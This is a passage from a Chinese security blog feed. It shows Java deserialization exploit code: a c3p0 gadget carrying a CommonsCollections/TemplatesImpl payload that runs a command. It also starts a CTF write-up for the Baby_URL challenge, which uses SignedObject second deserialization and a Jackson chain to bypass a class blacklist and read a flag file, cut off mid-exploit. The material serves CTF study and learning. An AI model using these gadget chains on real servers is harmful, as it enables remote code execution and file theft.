class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableUtils#fromByteArray<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">fromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123; <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> deserializeFromByteArray( bytes ); <br>    <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> IndirectlySerialized)<br>        <span class="hljs-keyword">return</span> ((IndirectlySerialized) out).getObject();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>配合<code>fastjson</code>或<code>ROME</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.mchange.lang.ByteUtils;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getCC6Bytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;p4d0rn&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(getCC6Bytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">wrapperConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考：</p><ul><li><p><a href="https://www.anquanke.com/post/id/256986#h3-9">https://www.anquanke.com/post/id/256986#h3-9</a></p></li><li><p><a href="https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/#hex%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">c3p0的三个gadget的学习 | Y4tacker’s Blog</a></p></li><li><p><a href="https://p4d0rn.gitbook.io/java/others/desertwice#rmiconnector">Deserialization Twice | Java (gitbook.io)</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链</title>
    <link href="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>这次本来是想学习Jackson原生链才开始做这道题打复现，但是没想到的是这道题的两个做法让我学习到了Jackson原生链结合二次反序列化绕黑名单或者打TemplatesImpl恶意字节码。</p><p>学到如今更觉受益匪浅，话不多说，直接开审。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>目录结构如下：</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png" alt="image-20240803211530820"></p><p><strong>IndexController.java</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(byteArrayInputStream);<br>            <span class="hljs-type">URLHelper</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (URLHelper)ois.readObject();<br>            System.out.println(o);<br>            System.out.println(o.url);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">file</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.createNewFile();<br>        &#125;<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        fis.read(bytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLHelper.java</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLHelper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String url;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">visiter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLHelper</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-built_in">this</span>.url = url;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.visiter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.visiter.visitUrl(<span class="hljs-built_in">this</span>.url);<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                file.createNewFile();<br>            &#125;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(result.getBytes());<br>            fos.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLVisitor.java</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLVisiter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLVisiter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">visitUrl</span><span class="hljs-params">(String myurl)</span> &#123;<br>        <span class="hljs-keyword">if</span> (myurl.startsWith(<span class="hljs-string">&quot;file&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file protocol is not allowed&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(myurl);<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(url.openStream()));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                String inputLine;<br>                <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    sb.append(inputLine);<br>                &#125;<br><br>                in.close();<br>                <span class="hljs-keyword">return</span> sb.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>                <span class="hljs-keyword">return</span> e.toString();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然我们需要打&#x2F;hack路由反序列化进去，&#x2F;file就是一个读文件的功能。再看两个URL自定义模板类，它们都继承了Serializable接口。</p><p>URLHelper重写了readObject方法，即为入口类。调用了任意类的visitUrl方法，并把结果写进文件里。</p><p>URLVisiter通过指定url访问其内部资源然后返回。</p><p>只不过我们需要注意的是&#x2F;hack路由的反序列化部分，它使用的是自定义的输入流的类<code>MyObjectInputStream</code>。这个类重写了<code>resolveClass</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>把InetAddress、CC链ban了，甚至把他自己写的URLVisitor和URLHelper给ban了，这里我们就引入第一个做法，应该也是预期解。</p><h3 id="SignedObject打二次反序列化绕过黑名单"><a href="#SignedObject打二次反序列化绕过黑名单" class="headerlink" title="SignedObject打二次反序列化绕过黑名单"></a>SignedObject打二次反序列化绕过黑名单</h3><p><code>SignedObject</code>的二次反序列化能够让我们正常使用到题目提供的<code>URLHelper</code>和<code>URLVister</code>，然后思路也很清晰，就是打<code>/hack</code>反序列化，file的<code>startWith</code>绕过可以在前面加个空格，或者全大写绕过。第一次读取目录和文件名找flag（是的，file:&#x2F;&#x2F;可以读目录），第二次读取flag。<code>/flie</code>路由可以读取到回显内容。</p><p>所以Exp呼之欲出，用<code>Jackson</code>原生链套上<code>SignedObject</code>打二次反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.PrivateKey;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot; file:///flag_eddiemurphy&quot;</span>);<br>        <span 